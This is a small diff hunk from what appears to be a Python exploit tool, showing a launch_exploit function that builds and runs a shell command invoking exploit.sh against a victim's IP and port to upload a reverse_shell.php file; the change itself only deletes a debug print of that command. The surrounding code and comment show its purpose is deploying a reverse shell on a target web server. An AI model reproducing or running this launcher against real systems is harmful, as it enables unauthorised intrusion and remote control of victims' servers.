@@ -59,7 +59,6 @@ def launch_exploit(attacker_info, victim_info):
 	s = ''
 	if victim_info['secure'] == True:
 		s = 's'
-	print('[DEBBUG] Exec => bash exploit.sh -u http' + s + '://{ip}:{port} -f {path}'.format(ip = victim_info["ip"], port = victim_info["port"], path = ( os.getcwd() + '/reverse_shell.php')))
 	os.system('''bash exploit.sh -u http''' + s + '''://{ip}:{port} -f {path}'''.format(ip = victim_info["ip"], port = victim_info["port"], path = ( os.getcwd() + '/reverse_shell.php')))
 
 # This function is responsible for preparing the reverse shell and sending it
